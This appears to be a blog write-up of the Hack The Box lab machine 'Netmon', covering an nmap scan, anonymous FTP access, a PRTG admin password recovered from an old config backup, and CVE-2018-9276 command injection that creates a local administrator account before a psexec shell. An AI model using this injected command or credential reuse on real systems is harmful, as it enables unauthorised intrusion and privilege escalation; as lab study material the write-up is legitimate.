---
title: "HTB - Netmon"
date: 2023-03-11T17:08:52+01:00
draft: false
tag: [HTB, Easy]
---

Netmon is an easy windows box on HTB that allows anonymous FTP access to the `C:\` drive and have an out of date, CVE vunlerable Paessler PRTG Network Monitor (Netmon) that runs as SYSTEM.

```
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_02-25-19  10:49PM       <DIR>          Windows
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-06T23:46:50
|_  start_date: 2023-02-06T23:31:49
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

Since anonymous user access is allowed, we can use it and connect ourselves to the machine. 

We get the user flag in the  `Users/Public`

With ftp we can access 

```
lftp 10.10.10.152:/ProgramData/Paessler/PRTG Network Monitor> ls
02-06-23  07:13PM       <DIR>          Configuration Auto-Backups
02-06-23  07:00PM       <DIR>          Log Database
02-02-19  11:18PM       <DIR>          Logs (Debug)
02-02-19  11:18PM       <DIR>          Logs (Sensors)
02-02-19  11:18PM       <DIR>          Logs (System)
02-07-23  12:00AM       <DIR>          Logs (Web Server)
02-06-23  07:01PM       <DIR>          Monitoring Database
02-25-19  09:54PM              1189697 PRTG Configuration.dat
02-25-19  09:54PM              1189697 PRTG Configuration.old
07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
02-07-23  03:37AM              1726351 PRTG Graph Data Cache.dat
02-25-19  10:00PM       <DIR>          Report PDFs
02-02-19  11:18PM       <DIR>          System Information Database
02-02-19  11:40PM       <DIR>          Ticket Database
02-02-19  11:18PM       <DIR>          ToDo Database
```

in the `PRTG Configuration.old.bak` we find a password
```xml
<dbpassword>
	<!-- User: prtgadmin -->
	PrTg@dmin2018
</dbpassword>
```

Since it's an old file we can try to use `PrTg@dmin2019`

## Remote access as SYSTEM using  CVE-2018-9276

We can gain admin access using an  RCE on a vulnerable version of PRTG Network Monitor 

1. Create a new notification inside Setup > Account Settings > Notifications
2. Select Execute Program and enter `azer.txt;net user bob bob /add;net localgroup administrators bob /add`

After waiting a bit we can access the SMB with full access

```
smbmap -H 10.10.10.152 -u bob -p "bob"
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.152...
[+] IP: 10.10.10.152:445 Name: 10.10.10.152
Disk    Permissions
----    ----------- 
ADMIN$  READ, WRITE
C$      READ, WRITE
IPC$    READ ONLY
```

we can use `psexec.py` to get a shell and access the root file


AAAAAAAAAAAAAAAA